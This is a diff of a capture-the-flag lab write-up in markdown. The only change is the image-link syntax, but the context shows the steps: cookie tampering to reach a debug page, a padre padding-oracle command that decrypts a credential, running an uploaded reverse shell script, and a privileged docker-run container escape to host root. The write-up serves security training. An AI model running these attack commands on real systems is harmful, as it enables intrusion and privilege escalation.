@@ -44,24 +44,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 In Site: 
-![[nyf1.png]]
+![](Assets/nyf1.png)
 In code view I found a script:
-![[nyf2.png]]
+![](Assets/nyf2.png)
 In Debug page code view:
-![[nyf3.png]]
+![](Assets/nyf3.png)
 According to the first script I added a cookie named `loggedin` and refreshed the page and the admin buffot changed to DEBUG
-![[nyf4.png]]
+![](Assets/nyf4.png)
 Clicking the stefan test I found 
-![[nyf5.png]]
+![](Assets/nyf5.png)
 Using the padre tool I decrypted the blob
 ```bash
 padre -u "http://10.10.222.223:8080/api/debug/$" -e lhex -err "Decryption error" "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4"
 ```
-![[nyf6.png]]
+![](Assets/nyf6.png)
 So the decrypted blob is
 `stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599`
 Using this credential I logged in as admin and got the admin flag. 
-![[nyf7.png]]
+![](Assets/nyf7.png)
 Now do the following to get the shell:
 Create a file with the following reverse shell 
 ```bash
@@ -73,7 +73,7 @@ Upload the file to the server executing the following command on the page.
 Open a listening port on the port 4444 to get the reverse shell.
 Give the shell executing privilege and execute it runnig the following command on the site. 
 `chmod +x /tmp/shell.sh && bash /tmp/shell.sh`
-![[nyf8.png]]
+![](Assets/nyf8.png)
 
 The flag-2 is in the `/app/docker-compose.yml`
 To escape the docker do the following:
@@ -88,4 +88,4 @@ openjdk                  11        47a932d998b7   2 years ago     654MB
 Using the image ID of gradle `d5954e1d9fa4`.
 Running the following command:
 `docker run -it --privileged  -v /:/mnt/ d5954e1d9fa4 chroot /mnt/ bash`
-![[nyf9.png]]
+![](Assets/nyf9.png)
